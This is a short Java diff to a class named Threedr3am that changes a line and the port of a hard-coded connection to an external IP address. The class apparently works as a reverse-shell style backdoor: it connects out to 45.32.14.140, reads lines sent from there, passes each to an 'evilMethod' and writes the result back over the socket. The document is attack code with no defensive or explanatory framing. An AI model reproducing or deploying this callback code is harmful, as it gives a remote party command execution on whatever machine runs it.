@@ -23,7 +23,8 @@ public class Threedr3am {
           String line;
           while ((line = bufferedReader.readLine()) == null)
             ;
-          bufferedWriter.write(EvilMethodClass.evilMethod(line));
+          String res = EvilMethodClass.evilMethod(line);
+          bufferedWriter.write(res);
           bufferedWriter.flush();
         }
 
@@ -34,6 +35,6 @@ public class Threedr3am {
   }
 
   public static void main(String[] args) {
-    new Threedr3am("45.32.14.140",12312);
+    new Threedr3am("45.32.14.140",12313);
   }
 }
